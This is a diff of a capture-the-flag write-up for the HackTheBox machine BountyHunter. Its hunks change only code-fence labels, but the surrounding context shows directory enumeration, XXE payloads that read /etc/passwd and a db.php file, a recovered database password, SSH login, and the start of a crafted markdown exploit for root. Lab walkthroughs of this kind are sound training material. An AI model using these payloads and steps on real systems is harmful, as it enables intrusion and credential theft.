@@ -29,7 +29,7 @@ Upon naviagation to the site, we also realize that the website uses `PHP` files 
 
 Using that information, we will run a directory enumeration on the webserver to identify all the `php` files hosted on the web server. During this process, we noticed an interesting file `db.php` and a `resources` directory on the webserver
 
-```bash
+```
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -z
 ===============================================================
@@ -91,7 +91,7 @@ Looking at the website, we discovered a `log_submit.php` endpoint. This page con
 
 Next we will first URL decode the payload. However, we realize that the payload is still encoded. But now, we realize that this encoded payload can be easily decoded with Base64 encoding. The final encoded payload matches the XML that we have obtained from the `bountylog.js` file that we have found earlier. This gives us the idea that we could do an XML injection on the payload.
 
-```bash
+```
 ┌──(kali㉿kali)-[~]
 └─$ echo PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50ZXN0PC90aXRsZT4KCQk8Y3dlPnRlc3Q8L2N3ZT4KCQk8Y3Zzcz50ZXN0PC9jdnNzPgoJCTxyZXdhcmQ+dGVzdDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg== | base64 --decode
 <?xml  version="1.0" encoding="ISO-8859-1"?>
@@ -106,7 +106,7 @@ Next we will first URL decode the payload. However, we realize that the payload 
 So now we will modify the payload to exfiltrate data from ```/etc/passwd``` file. (Note that we will still have to base 64 encode and URL encode the payload). The response that we received from the webserver revealed the ```/etc/passwd``` file, which confirmed that this webserver is vulnerable to XML injection. 
 
 
-```bash
+```
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
 <!ELEMENT foo ANY >
@@ -121,7 +121,7 @@ So now we will modify the payload to exfiltrate data from ```/etc/passwd``` file
 
 We noticed that there is a `development` user that might not require a password to SSH into. Hence, we will try out luck, but apparently I have either no or extremely low luck and so, I am unable to SSH into the server as it requires a password to SSH into.
 
-```bash
+```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ssh development@10.10.11.100                                         3 ⚙
 development@10.10.11.100's password: 
@@ -134,7 +134,7 @@ development@10.10.11.100: Permission denied (publickey,password).
 
 Now, we remember from our `gobuster` that we have discovered a `db.php` file and this file is most likely stored in `/var/www/html` directory on the webserver. So, we modify our payloads to try to exfiltrate this file. After numerous tries on different payloads, we were able to obtain an encoded text in the response!
 
-```bash
+```
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
 <!ELEMENT foo ANY >
@@ -149,7 +149,7 @@ Now, we remember from our `gobuster` that we have discovered a `db.php` file and
 
 Decoding the encoded text that we have obtained in the response gives us the contents of the file. 
 
-```bash
+```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ echo PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo= | base64 --decode
 <?php
@@ -166,7 +166,7 @@ $testuser = "test";
 
 With the `developement` user that we have obtained earlier and the password that we have obtained from the `db.php` file, we are now able to login to the SSH server, and obtain the user flag
 
-```bash
+```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ssh development@10.10.11.100                                         3 ⚙
 development@10.10.11.100 password:
@@ -204,7 +204,7 @@ development@bountyhunter:~$ cat user.txt
 
 However, we are far from done yet! We still have not obtained the system flag. Using `sudo -l` we have discovered that `/opt/skytrain_inc/ticketValidator.py` has root permissions. However, we've also realised that we cannot modify the code file to create a root shell as `/usr/bin/nano` and `/usr/bin/vi` are not given root privileges.
 
-```bash
+```
 development@bountyhunter:~$ sudo -l
 Matching Defaults entries for development on bountyhunter:
     env_reset, mail_badpass,
@@ -271,7 +271,7 @@ There are 3 things happening on the last section of the code.  Firstly, the four
 
 With the above information from the code analysis, we can craft a payload in `markdown` file format that will reveal the system flag successfully!
 
-```bash
+```
 development@bountyhunter:~$ cat exploit.md
 # Skytrain Inc
 ## Ticket to exploit
